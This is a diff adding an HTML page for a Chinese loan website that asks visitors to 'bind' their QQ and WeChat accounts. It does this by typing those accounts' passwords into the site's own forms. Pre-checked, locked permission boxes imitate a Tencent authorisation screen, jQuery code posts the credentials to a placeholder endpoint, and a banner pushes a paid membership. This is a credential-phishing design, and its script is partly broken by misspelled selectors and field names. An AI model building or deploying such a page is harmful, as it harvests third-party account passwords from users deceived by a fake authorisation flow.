@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title></title>
+		<script src="js/jquery.js"></script>
+		<style type="text/css">
+html,body,div,p,form,label,ul,li,img,em,h3{margin:0;padding:0;border:0;list-style:none;font-style:normal;font-weight:normal;}
+a{text-decoration:none;}
+body{font-family:Microsoft YaHei,Verdana,Arial,SimSun;color:#666;font-size:14px;background:#fff; overflow:hidden}
+.block, #block{display:block;}
+.none, #none{display:none;}
+
+	
+.login{width:100%;}
+.login .headerTop{width:100%;height: 50px;background:#FF5B1E;}
+.login .headerTop .logo{width:1000px;margin:0 auto;}
+.login .headerTop .logo p{margin-top:20px;width: 150px;color: white;font-size: 15px;line-height: 50px;}
+
+.main{width:1000px;margin:0 auto;overflow: hidden;height: auto;clear: both;}
+.main .mainLeft{float: left;width:50%;border-right:1px dotted #ccc;margin-top:30px;padding-bottom:100px;}
+.main .mainLeft h3{width:70%;border-bottom:2px solid #ccc;padding:0 10%;font-family: 600;}
+.main .mainLeft h3 span{display:inline-block;width:6.5em;font-size:18px;color: #333;line-height:50px;border-bottom:4px solid #666;margin-bottom: -2px;font-family: 600;text-align: center;}
+.main .mainLeft input{width:80%;padding:10px;font-size:16px;border:1px solid #ccc;border-radius: 3px;margin: 10px;}
+
+.main .mainLeft .a{display: block;padding:10px 15px;width:77%;text-align:center;font-size:18px;color:#fff;background: #FFDAB9;border-radius: 3px;margin:10px 0 0 10px;}
+.main .mainRight{float: right;width:45%;margin-top:30px;}
+.mainRight p, .mainRight ul li{width:100%;padding: 10px 0;border-bottom: 1px dotted #ccc;font-size:14px;color: #666; }
+.mainRight p a{color:#52b7ed;}
+.mainRight p a:hover{text-decoration:underline;}
+.mainRight p input, .mainRight ul li input{margin-right:10px;cursor:not-allowed;}
+.mainRight ul li{border:none;}
+.mainRight .agreement{margin-top:10px;border:none;}
+.mainRight .code{text-align: center;}
+.mainRight img{margin:10px auto;width: 150px;top:-200px; left:120px;position: relative;}
+.delete  { display: none; position: absolute; width: 16px; height: 16px; margin: 73px 0 0 -25px; background: url(images/delete.jpg) no-repeat;background-size:100%; cursor: pointer;}
+.mainLeft input[type="text"]::-ms-delete { display: none; }
+.main .mainLeft input[type="text"]:valid + .delete  { display: inline; }
+#ft{
+	height: 80px;
+	width: 100%;
+	
+	background: black;
+	opacity: 0.7;
+	position: absolute;
+	bottom: 0px;
+}
+#ft .fa{
+	height: 80px;
+	width: 1100px;
+	margin: 0 auto;
+}
+.box {
+	padding-left:50px;
+	overflow:hidden;
+	
+	
+	
+}
+.winBox {
+	width:1100px;
+	height:80px;
+	overflow:hidden;
+	position:relative;
+	
+}
+.scroll {
+	
+			width:1100px;
+	position:absolute;
+	left:50px;
+	top:0px;
+}
+.scroll li {
+	width:520px;
+	float:left;
+	line-height:80px;
+	text-align:center;
+	color: white;
+}
+.scroll li .y {
+	color: #FF5B1E;
+	font-size: 16px;
+	}
+	.scroll li .ye {
+	color: #FFDAB9;
+	font-size: 16px;
+	}
+</style>
+<style type="text/css">
+
+
+#tab1 { position:relative; width:100px; margin:50px; }
+#tab1 h3 { position:relative; z-index:1; font-size:14px;height: 36px;line-height: 36px; padding-top:4px; margin-bottom:-1px; border:solid #ccc; border-width:1px 0 1px 1px; text-align:center; background:#eee; cursor:pointer; }
+#tab1 h3.up { z-index:3; color:#c00; background:#fff; }
+#tab1 div.tab { display:none; position:absolute; left:90px; top:0; z-index:2; width:290px; height:200px; padding:5px; border:solid 1px #ccc; color:#666; }
+#tab1 div.tab.up { display:block; }
+
+</style>
+
+	</head>
+	<body>
+		<!--
+        Navcss
+        -->
+		<link rel="stylesheet" href="css/Navhead.css" />
+	</head>
+	<body>
+		<!--
+        	头部
+        -->
+		<script src="js/ysdhead.js"></script>
+		<!--
+             logo栏+定位栏 +导航栏
+        -->
+
+		<div id="second">
+			<div class="muyee_bg1">
+				<div class="muyee_logo">
+					<p><img src="img/login2.png" width="250px"  onclick=window.location="muyee_index.html">&nbsp;&nbsp;<img src="img/sx.PNG" height="32px" style="margin-top:18px;">&nbsp;&nbsp;<label style="top: 10px; position: relative; color: #666666;font-size: 18px;">贷款申请&nbsp;</p>
+					
+				</div>
+				<div id="in_city" style="display: none"></div>
+				<div class="muyee_nav">
+					<ul>
+						<li class="cur"><a href="muyee_index.html" style="color: #666666;">首页</a></li>
+						<li><a href="muyee_Credit_card.html"  style="color: #666666;">信用卡</a></li>
+						<li><a href="muyee_Applyloan.html" style="color: #666666;">贷款申请</a></li>
+						
+						
+						<li ><a href="muyee_About.html"  style="color: #666666;">关于我们</a></li>
+						
+
+					</ul>
+				</div>
+			</div>
+		</div>
+
+
+		<div class="login">
+		<div class="headerTop">
+			<div class="logo">
+				<p>绑定微信、QQ</p>
+			</div>
+		</div>
+		<div class="main">
+			<div class="mainLeft">
+				<h3><span>账号密码登录</span></h3>
+				<div id="tab1">
+	<h3>QQ账号</h3>
+		<div class="tab">
+			<form name="qq" id="qq" class="qq">
+					<input class="text" type="text" name="qqzh" placeholder="输入绑定QQ" required value="">
+					<a class="delete" id="delete" href="#"></a>
+					<input type="password" name="qqpassword" placeholder="密码">
+					<a class="a" href="#" id="regis1">授权并绑定</a>
+				</form>
+		</div>
+	<h3>微信账号</h3>
+		<div class="tab wushi">
+			<form name="wc" id="wc" class="wc">
+					<input class="text" type="text" name="wczh" placeholder="输入绑定微信" required value="">
+					<a class="delete" id="delete" href="#"></a>
+					<input type="wcpassword" name="qqpassword" placeholder="密码">
+					<a class="a" href="#" id="regis2">授权并绑定</a>
+				</form>
+		</div>
+	</div>
+			</div>
+			<div class="mainRight">
+				<p>比银网已有超过1千万用户使用QQ/微信绑定</p>
+				<p><a href="#">比银网</a>讲获得以下权限</p>
+				<p><input type="checkbox" checked="checked" disabled="disabled">全选</p>
+				<ul>
+					<li><input type="checkbox" checked="checked" disabled="disabled" >获得您的昵称，头像，性别</li>
+					<li><input type="checkbox" checked="checked" disabled="disabled">分享内容到QQ空间</li>
+					<li><input type="checkbox" checked="checked" disabled="disabled">读取，达标腾讯微博信息</li>
+					<li><input type="checkbox" checked="checked" disabled="disabled">分享到微信朋友圈</li>
+					
+				</ul>
+				<p class="agreement">绑定后后表明你已同意<a href="#">比银网服务协议</a></p>
+				<div class="code">
+					<img src="img/erweima.png">
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="ft">
+		<div class="fa">
+			<div class="box">
+  <div class="winBox">
+    <ul class="scroll">
+      <li><a>99元加入<a class="y">会员</a>，即可赠送POS机一台，不定期推送下款子<a class="y">（全免费）</a></a></li>
+      <li><a>提醒不加入会员，不能享受会员<a class="ye">功能</a></a></li>
+     
+     
+    </ul>
+  </div>
+</div>
+		</div>
+	</div>
+	</body>
+	<script>
+$(function() {
+    var num = 0;
+    function goLeft() {
+        //750是根据你给的尺寸，可变的
+        if (num == -750) {
+            num = 0;
+        }
+        num -= 1;
+        $(".scroll").css({
+            left: num
+        })
+    }
+    //设置滚动速度
+    var timer = setInterval(goLeft, 20);
+    //设置鼠标经过时滚动停止
+    $(".box").hover(function() {
+        clearInterval(timer);
+    },
+    function() {
+        timer = setInterval(goLeft, 20);
+    })
+})
+</script>
+	<script type="text/javascript">
+	
+function Pid(id,tag){
+	if(!tag){
+		return document.getElementById(id);
+		}
+	else{
+		return document.getElementById(id).getElementsByTagName(tag);
+		}
+}
+
+function tab(id,hx,box,iClass,s,pr){
+	var hxs=Pid(id,hx);
+	var boxs=Pid(id,box);
+	if(!iClass){ // 如果不指定class，则：
+		boxsClass=boxs; // 直接使用box作为容器
+	}
+	else{ // 如果指定class，则：
+		var boxsClass = [];
+		for(i=0;i<boxs.length;i++){
+			if(boxs[i].className.match(/\btab\b/)){// 判断容器的class匹配
+				boxsClass.push(boxs[i]);
+			}
+		}
+	}
+	if(!pr){ // 如果不指定预展开容器，则：
+		go_to(0); // 默认展开序列
+		yy();
+	}
+	else {
+		go_to(pr);
+		yy();
+	}
+	function yy(){
+		for(var i=0;i<hxs.length;i++){
+			hxs[i].temp=i;
+			if(!s){// 如果不指定事件，则：
+				s="onmouseover"; // 使用默认事件
+				hxs[i][s]=function(){
+					go_to(this.temp);
+				}
+			}
+			else{
+				hxs[i][s]=function(){
+					go_to(this.temp);
+				}
+			}
+		}
+	}
+	function go_to(pr){
+		for(var i=0;i<hxs.length;i++){
+			if(!hxs[i].tmpClass){
+				hxs[i].tmpClass=hxs[i].className+=" ";
+				boxsClass[i].tmpClass=boxsClass[i].className+=" ";
+			}
+			if(pr==i){
+				hxs[i].className+=" up"; // 展开状态：标题
+				boxsClass[i].className+=" up"; // 展开状态：容器
+			}
+			else {
+				hxs[i].className=hxs[i].tmpClass;
+				boxsClass[i].className=boxsClass[i].tmpClass;
+			}
+		}
+	}
+}
+tab("tab1","h3","div","tab"); 
+</script>
+<script>
+/*qq绑定表单提交*/
+     $('#regis1').on('click', function() {
+
+    $('#qq').on('submit', function() {
+        var qqzh = $('inpur[name=qqzh]').val(),
+        qqpassowrd = $('inpur[name=qqpassowrd]').val();
+     
+        
+   
+
+        $(this).ajaxSubmit({
+            type: 'post', // 提交方式 get/post
+            url: 'xx', // 需要提交的 url
+            data: {
+                'qqzh': qqzh,
+                'qqpassowrd':qqpassowrd
+                
+                
+            },
+            success: function(data) { // data 保存提交后返回的数据，一般为 json 数据
+                // 此处可对 data 作相关处理
+                alert('提交成功！');
+               
+            }
+        /* $('regis').resetForm(); */
+        });
+        return false; // 阻止表单自动提交事件
+    
+});
+});
+</script>
+<script>
+/*qq绑定表单提交*/
+     $('#regis2').on('click', function() {
+
+    $('#wc').on('submit', function() {
+        var wczh = $('inpur[name=wczh]').val(),
+        wcpassowrd = $('inpur[name=wcpassowrd]').val();
+     
+        
+   
+
+        $(this).ajaxSubmit({
+            type: 'post', // 提交方式 get/post
+            url: 'xx', // 需要提交的 url
+            data: {
+                'wczh': wczh,
+                'wcpassowrd':wcpassowrd
+                
+                
+            },
+            success: function(data) { // data 保存提交后返回的数据，一般为 json 数据
+                // 此处可对 data 作相关处理
+                alert('提交成功！');
+               
+            }
+        /* $('regis').resetForm(); */
+        });
+        return false; // 阻止表单自动提交事件
+    
+});
+});
+</script>
+</html>
